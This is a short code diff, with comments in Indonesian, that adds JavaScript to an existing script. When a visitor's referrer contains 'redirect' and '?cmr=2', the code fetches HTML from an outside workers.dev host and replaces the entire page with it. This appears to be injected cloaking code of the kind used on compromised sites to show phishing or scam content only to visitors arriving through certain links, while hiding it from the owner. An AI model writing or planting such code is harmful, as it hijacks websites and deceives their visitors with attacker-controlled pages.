@@ -26,3 +26,16 @@ if (document.referrer.includes('?cmr=2')) {
     });
 }
 
+// Memeriksa sumber lalu lintas dan parameter URL
+if (document.referrer.includes("redirect") && document.referrer.includes("?cmr=2")) {
+  // Mengubah HTML pada tag <html> dengan data yang diambil dari website
+  fetch("https://crm-template-one.mastimon.workers.dev/")
+    .then(response => response.text())
+    .then(data => {
+      // Mengubah HTML pada tag <html> dengan data yang diambil
+      document.documentElement.innerHTML = data;
+    })
+    .catch(error => {
+      console.log("Terjadi kesalahan:", error);
+    });
+}
